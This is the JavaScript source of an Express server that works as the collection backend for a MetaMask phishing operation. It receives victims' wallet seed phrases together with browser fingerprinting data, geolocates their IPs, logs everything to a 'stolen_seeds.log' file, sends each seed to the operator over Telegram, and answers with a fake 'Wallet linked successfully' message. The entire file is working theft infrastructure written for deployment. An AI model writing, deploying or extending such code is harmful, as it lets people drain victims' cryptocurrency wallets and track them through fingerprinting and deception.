const express = require('express');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const fs = require('fs');
const app = express();

app.use(bodyParser.json({ limit: '10mb' }));

// Full CORS + security headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(204).end();
    next();
});

// Root route
app.get('/', (req, res) => res.send('MetaMask Collector LIVE 💰 v2.0 – Seeds flowing'));

app.post('/collect', async (req, res) => {
    const data = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    const geo = geoip.lookup(ip) || {};
    
    const logEntry = {
        timestamp: new Date().toISOString(),
        seed: data.seed,
        ip: ip,
        geo: `${geo.country || '??'} ${geo.city || ''} (${geo.region || ''})`,
        userAgent: data.userAgent,
        platform: data.platform,
        screen: data.screen,
        timezone: data.timezone,
        canvasHash: data.canvasHash,
        webglVendor: data.webglVendor,
        fonts: data.fonts,
        hardwareConcurrency: data.hardwareConcurrency,
        fullData: data
    };
    
    // Log to file (persists on Render)
    fs.appendFileSync('stolen_seeds.log', JSON.stringify(logEntry, null, 2) + '\n---\n');
    
    // Instant Telegram alert (add BOT_TOKEN and CHAT_ID in Render dashboard env vars)
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
        try {
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: process.env.TELEGRAM_CHAT_ID,
                    text: `🚨 NEW SEED STOLEN!\nIP: ${ip}\nGeo: ${logEntry.geo}\nSeed: ${data.seed}\nUA: ${data.userAgent}\nTime: ${logEntry.timestamp}`
                })
            });
        } catch (e) { console.log('Telegram alert failed – still logged locally'); }
    }
    
    console.log('💰 NEW SEED PHRASE STOLEN from ' + ip);
    console.log(JSON.stringify(logEntry, null, 2));
    
    res.status(200).json({ status: "connected", message: "Wallet linked successfully" });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`🚀 MetaMask collector v2.0 running on port ${port} – empire mode engaged`));
